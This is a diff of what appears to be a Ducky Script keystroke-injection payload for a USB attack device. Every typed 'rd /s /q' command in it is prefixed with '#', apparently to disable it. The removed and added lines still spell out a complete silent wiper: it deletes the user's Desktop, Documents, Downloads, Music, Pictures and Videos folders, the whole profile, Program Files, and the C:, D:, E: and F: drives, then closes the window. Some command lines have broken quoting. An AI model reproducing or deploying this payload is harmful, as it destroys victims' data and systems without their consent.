@@ -8,29 +8,29 @@ DELAY 500
 LEFT
 DELAY 500
 ENTER
-STRING rd "%userprofile%\Desktop\" /s /q 
+#STRING rd "%userprofile%\Desktop\" /s /q 
 ENTER
-STRING rd "%userprofile%\Documents\" /s /q 
+#STRING rd "%userprofile%\Documents\" /s /q 
 ENTER
-STRING rd "%userprofile%\Downloads\" /s /q 
+#STRING rd "%userprofile%\Downloads\" /s /q 
 ENTER
-STRING rd "%userprofile%\Music\" /s /q 
+#STRING rd "%userprofile%\Music\" /s /q 
 ENTER
-STRING rd "%userprofile%\Pictures\" /s /q 
+#STRING rd "%userprofile%\Pictures\" /s /q 
 ENTER
-STRING rd "%userprofile%\Videos\" /s /q 
+#STRING rd "%userprofile%\Videos\" /s /q 
 ENTER
-STRING rd "%userprofile% /s /q 
+#STRING rd "%userprofile% /s /q 
 ENTER
-STRING rd "C:\Program Files /s /q 
+#STRING rd "C:\Program Files /s /q 
 ENTER
-STRING rd "C:\Program Files (x86) /s /q 
+#STRING rd "C:\Program Files (x86) /s /q 
 ENTER
-STRING rd "C: /s /q 
+#STRING rd "C: /s /q 
 ENTER
-STRING rd "D: /s /q 
+#STRING rd "D: /s /q 
 ENTER
-STRING rd "E: /s /q 
+#STRING rd "E: /s /q 
 ENTER
-STRING rd "F: /s /q 
+#STRING rd "F: /s /q 
 ALT F4
